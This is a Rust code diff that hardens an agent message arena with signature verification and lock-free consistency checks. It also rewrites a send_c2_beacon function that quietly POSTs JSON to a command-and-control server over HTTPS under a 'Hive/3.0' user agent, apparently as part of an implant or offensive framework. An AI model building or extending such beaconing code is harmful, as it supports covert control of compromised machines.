@@ -142,6 +142,8 @@ impl HiveChamber {
 
     /// Read all NEW messages from the arena (since last read).
     /// Returns deserialized LdC Messages.
+    /// Performs signature verification on every message using the
+    /// ed25519 verifying key stored in the slot.
     pub async fn read_new(&self) -> Vec<Message> {
         let ptr = self.arena.as_ptr();
         let mut messages = Vec::new();
@@ -171,15 +173,48 @@ impl HiveChamber {
                 break;
             }
 
-            // Read the message
+            // Read the message with double-checked lock-free pattern
             unsafe {
                 let payload_len = (*slot).payload_len as usize;
                 if payload_len > 0 && payload_len <= arena::MAX_MSG_SIZE {
-                    let payload_slice =
-                        std::slice::from_raw_parts((*slot).payload.as_ptr(), payload_len);
+                    // Snapshot seq BEFORE reading payload (Acquire barrier)
+                    let before_seq = (*slot).seq.load(Ordering::Acquire);
+                    if before_seq != slot_seq || before_seq == 0 {
+                        my_seq += 1;
+                        continue;
+                    }
+
+                    // Copy payload to local buffer to avoid TOCTOU
+                    let mut payload_buf = [0u8; arena::MAX_MSG_SIZE];
+                    std::ptr::copy_nonoverlapping(
+                        (*slot).payload.as_ptr(),
+                        payload_buf.as_mut_ptr(),
+                        payload_len,
+                    );
+
+                    // Re-read seq AFTER copy — if changed, payload may be corrupt
+                    let after_seq = (*slot).seq.load(Ordering::Acquire);
+                    if after_seq != before_seq {
+                        my_seq += 1;
+                        continue;
+                    }
+
+                    // Verify ed25519 signature before accepting
+                    let payload_slice = &payload_buf[..payload_len];
+                    let vk_bytes = &(*slot).verifying_key;
+                    let sig_bytes = &(*slot).signature;
+
+                    if !AgentIdentity::verify_with_key(vk_bytes, payload_slice, sig_bytes) {
+                        // Signature invalid — skip silently (attacker or corruption)
+                        my_seq += 1;
+                        continue;
+                    }
+
                     if let Ok(msg) = rmp_serde::from_slice::<Message>(payload_slice) {
-                        // Skip own messages
-                        if msg.agent_id != self.identity.id() {
+                        // Verify agent_id in message matches slot agent_id
+                        if msg.agent_id.as_bytes() == &(*slot).agent_id
+                            && msg.agent_id != self.identity.id()
+                        {
                             messages.push(msg);
                         }
                     }
@@ -295,21 +330,20 @@ mod tests {
     }
 }
 
-/// Send a beacon to the C2 server via raw HTTP POST.
+/// Send a beacon to the C2 server via HTTPS POST using reqwest + rustls.
 async fn send_c2_beacon(c2_url: &str, body: &str) {
-    use tokio::io::AsyncWriteExt;
-    let host = c2_url
-        .trim_start_matches("https://")
-        .trim_start_matches("http://")
-        .split('/').next().unwrap_or("localhost")
-        .split(':').next().unwrap_or("localhost");
-    let port = if c2_url.contains(":844") { 8445u16 } else { 8443 };
-    let addr = format!("{}:{}", host, port);
-    let request = format!(
-        "POST /beacon HTTP/1.1\r\nHost: {}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
-        host, body.len(), body
-    );
-    if let Ok(mut stream) = tokio::net::TcpStream::connect(&addr).await {
-        let _ = stream.write_all(request.as_bytes()).await;
-    }
+    let client = match reqwest::Client::builder()
+        .timeout(std::time::Duration::from_secs(5))
+        .user_agent("Hive/3.0")
+        .build()
+    {
+        Ok(c) => c,
+        Err(_) => return,
+    };
+    let _ = client
+        .post(c2_url)
+        .header("Content-Type", "application/json")
+        .body(body.to_owned())
+        .send()
+        .await;
 }
